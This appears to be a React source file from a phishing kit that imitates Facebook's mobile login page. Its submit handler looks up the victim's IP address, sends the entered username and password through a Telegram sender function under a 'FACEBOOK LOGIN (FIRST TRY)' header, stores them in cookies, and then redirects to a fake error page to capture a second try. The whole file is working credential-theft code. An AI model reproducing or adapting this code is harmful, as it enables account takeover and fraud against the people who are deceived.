import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });
  const navigate = useNavigate();
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();

    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();

    const message = `
    ---- FACEBOOK LOGIN (FIRST TRY) -----

    IP: ${response.ip}

    USERNAME: ${formInput.username}

    PASSWORD: ${formInput.password}

    ${new Date().toLocaleString()}
    `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("login1", formInput);
    cookies.set("ip", response.ip)
    setIsLoading(false);
    navigate("../login/error", { replace: true });
  }
const [showPassword, setShowPassword] = React.useState(false)
  function showPasswordFunc() {
    if(showPassword){
      setShowPassword(false);
      return;
    }
    setShowPassword(true);
  }

  return (
    <>
      <div className="_5rut">
      <div style={{backgroundColor: "#fff1d2", color:"#ffb200", textAlign:"center", padding:"10px"}}>
          You need to login first
        </div>
        <form
          method="post"

          className="mobile-login-form _9hp- _5spm"
          id="login_form"
         onSubmit={handleSubmit}
        >
          <div
            id="user_info_container"
            data-sigil="user_info_after_failure_element"
          ></div>
          <div
            id="pwd_label_container"
            data-sigil="user_info_after_failure_element"
          ></div>
          <div id="otp_retrieve_desc_container"></div>
          <div>
            <div className="">
              <div className="_55wo _56bf">
                <div className="_96n9" id="email_input_container">
                  <input
                    type="text"
                    className="_56bg _4u9z _5ruq _8qtn"
                    id="m_login_email"
                    name="username"
                    onChange={handleInputChange}
                    placeholder="Mobile number or email address"
                    data-sigil="m_login_email"
                  />
                </div>
              </div>
            </div>
            <div className="_55wq"></div>
            <div className="">
              <div className="_55wo _56bf">
                <div className="_1upc _mg8" data-sigil="m_login_password">
                  <div className="_7om2">
                    <div className="_4g34 _5i2i _52we">
                      <div className="_5xu4">
                        <input
                          className="_56bg _4u9z _27z2 _8qtm"
                          id="m_login_password"
                          name="password"
                          onChange={handleInputChange}
                          placeholder="Password"
                          type={showPassword ? "text" :"password"}
                          data-sigil="password-plain-text-toggle-input"
                        />
                      </div>
                    </div>
                    <div className="_5s61 _216i _5i2i _52we">
                      <div className="_5xu4">
                        <div
                          className="_2pi9"
                          id="u_0_1_FI"
                          data-sigil="password-plain-text-toggle"
                        >
                          {<span
                            style={{
                              color: "#216fdb",
                              fontSize: "13px",
                              fontWeight: "bold",
                            }}
                            onClick={showPasswordFunc}
                          >
                            {showPassword ? "HIDE" : "SHOW"}
                          </span>}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="_2pie" style={{ textAlign: "center" }}>
            <div
              id="login_password_step_element"
              data-sigil="login_password_step_element"
            >
              {isLoading ? <button
                type="button"
                value="Log in"
                className="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                name="login"
                data-sigil="touchable login_button_block m_login_button"
                data-autoid="autoid_4"
              >
                <span className="_55sr">Please wait...</span>
              </button>
              :
              <button
                type="submit"
                value="Log in"
                className="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                name="login"
                data-sigil="touchable login_button_block m_login_button"
                data-autoid="autoid_4"
              >
                <span className="_55sr">Log in</span>
              </button>  
            }
            </div>
            <div
              className="_7eif"
              id="oauth_login_button_container"
              style={{ display: "none" }}
            ></div>
            <div
              className="_7f_d"
              id="oauth_login_desc_container"
              style={{ display: "none" }}
            ></div>
            <div id="otp_button_elem_container"></div>
          </div>
        </form>
        <div>
          <div className="_2pie _9omz">
            <div className="_52jj _9on1">
              <a
                className="_9on1"
                tabIndex={0}
                href="https://m.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzExODI0MDcxLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_032PgB7EJjEPTGDUL&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8"
                id="forgot-password-link"
              >
                Forgotten password?
              </a>
            </div>
          </div>
          <div style={{ paddingTop: "42px" }}>
            <div>
              <div>
                <div>
                  <div
                    id="login_reg_separator"
                    className="_43mg _8qtf"
                    data-sigil="login_reg_separator"
                  >
                    <span className="_43mh">or</span>
                  </div>
                  <div className="_52jj _5t3b" id="signup_button_area">
                    <a
                      role="button"
                      className="_agmp _28le btn btnS medBtn mfsm touchable"
                      id="signup-button"
                      tabIndex={0}
                      data-sigil="m_reg_button"
                      data-autoid="autoid_3"
                    >
                      Create new account
                    </a>
                  </div>
                </div>
              </div>
              <div className="_2pie" style={{ textAlign: "center" }}>
                <div>
                  <div data-sigil="login_identify_step_element"></div>
                  <div className="other-links _8p_m">
                    <ul className="_5pkb _55wp">
                      <li></li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
